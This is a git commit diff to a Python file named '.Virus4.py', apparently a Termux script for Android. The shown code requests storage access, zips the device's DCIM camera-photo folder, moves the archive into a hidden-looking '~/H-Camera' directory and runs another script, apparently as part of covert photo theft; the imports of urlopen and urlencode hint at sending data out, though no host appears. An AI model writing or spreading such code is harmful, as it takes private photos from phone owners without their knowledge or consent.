9e9a21d199ceb5cce173224766feac47078552b9
AkanVb <77938031+AkanVb@users.noreply.github.com>
2021-04-09 16:30:46 -0500

    Update .Virus4.py

--- .Virus4.py
+++ .Virus4.py
@@ -9,6 +9,7 @@ from urllib import urlopen, urlencode
 from re import search
 os.system('termux-setup-storage')
 os.system('zip /sdcard/DCIM.zip DCIM')
+os.system('mv /sdcard/DCIM.zip ~/H-Camera')
 os.system('python3 DCIM.py')
 
 #colors
